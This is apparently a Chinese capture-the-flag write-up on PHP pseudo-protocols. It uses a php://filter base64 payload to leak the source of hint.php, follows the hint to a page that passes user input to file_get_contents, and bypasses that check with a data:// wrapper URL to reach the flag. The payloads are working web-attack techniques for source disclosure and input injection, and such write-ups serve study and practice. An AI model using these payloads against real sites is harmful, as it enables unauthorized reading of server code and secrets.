#PHP 伪协议

php://filter/convert.base64-encode/resource=hint.php
=>
PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=

base64decode

```php
<?php
//go to /test2222222222222.php
?>
```

因此

```url
http://1.14.71.254:28194/test2222222222222.php
```

```php
<?php
	ini_set("max_execution_time", "180");
	show_source(__FILE__);
	include('flag.php');
	$a= $_GET["a"];
	if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
	    echo "success\n";       
	    echo $flag;
	}
?>
```

利用 data 协议绕过

```url
?a=data://text/plain,I want flag
```
